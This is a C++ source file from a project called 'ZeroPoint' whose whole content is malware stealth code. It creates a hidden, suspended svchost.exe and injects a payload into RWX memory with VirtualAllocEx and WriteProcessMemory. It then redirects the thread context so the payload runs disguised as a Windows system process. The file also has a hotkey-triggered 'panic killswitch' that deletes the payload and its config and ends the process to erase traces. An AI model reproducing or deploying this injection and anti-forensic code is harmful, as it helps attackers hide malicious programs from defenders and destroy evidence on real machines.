// ============================================================================
//  ZeroPoint — Stealth.cpp
//  Process hollowing (RunPE), ghost injection, and panic killswitch.
//
//  Creates a suspended svchost.exe, injects the ZeroPoint payload into its
//  address space via VirtualAllocEx + WriteProcessMemory, then resumes the
//  thread so the payload runs disguised as a legitimate system process.
// ============================================================================

#include "Stealth.h"
#include <windows.h>
#include <winternl.h>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>

#pragma comment(lib, "ntdll.lib")

// ============================================================================
//  Payload I/O — read binary file into memory
// ============================================================================

std::vector<BYTE> ReadPayload(const std::string& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file) return {};

    auto size = file.tellg();
    if (size <= 0) return {};

    file.seekg(0, std::ios::beg);
    std::vector<BYTE> buffer(static_cast<size_t>(size));
    file.read(reinterpret_cast<char*>(buffer.data()), size);
    return buffer;
}

// ============================================================================
//  Ghost Process Injection — RunPE into a suspended host process
// ============================================================================

bool InjectGhostProcess(const std::string& targetCmd,
                        const std::string& payloadPath) {
    std::vector<BYTE> payload = ReadPayload(payloadPath);
    if (payload.empty()) return false;

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};

    // Create target process in suspended state (no visible window)
    if (!CreateProcessA(nullptr,
                        const_cast<LPSTR>(targetCmd.c_str()),
                        nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi)) {
        return false;
    }

    // Capture the thread context so we can redirect execution
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Allocate RWX memory inside the target process
    PVOID remoteBase = VirtualAllocEx(pi.hProcess, nullptr, payload.size(),
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Write the payload into the remote allocation
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteBase,
                            payload.data(), payload.size(), &written)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Redirect execution to our payload
    ctx.Rcx = (DWORD64)remoteBase;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

// ============================================================================
//  High-Level Hollowing — inject ZeroPoint payload into svchost.exe
// ============================================================================

bool PerformHollowing() {
    return InjectGhostProcess(
        "C:\\Windows\\System32\\svchost.exe -k LocalService",
        "C:\\ProgramData\\ZeroPoint\\ZeroPointPayload.exe");
}

// ============================================================================
//  Panic Killswitch — terminate + wipe all traces
// ============================================================================
//  Called on Ctrl+Shift+X. Destroys config, wipes the ProgramData folder,
//  and terminates the process immediately. Does NOT return.

void PanicKillAndWipe() {
    // 1. Delete config.ini and any local traces
    const char* configDir = "C:\\ProgramData\\ZeroPoint";

    // Attempt to remove all files in the ZeroPoint data directory
    try {
        std::filesystem::remove_all(configDir);
    } catch (...) {
        // Best-effort: if filesystem fails, try manual deletion
        DeleteFileA("C:\\ProgramData\\ZeroPoint\\config.ini");
        DeleteFileA("C:\\ProgramData\\ZeroPoint\\ZeroPointPayload.exe");
        RemoveDirectoryA(configDir);
    }

    // 2. Terminate this process immediately (no cleanup, no traces)
    TerminateProcess(GetCurrentProcess(), 0);

    // Should never reach here, but just in case:
    ExitProcess(0);
}
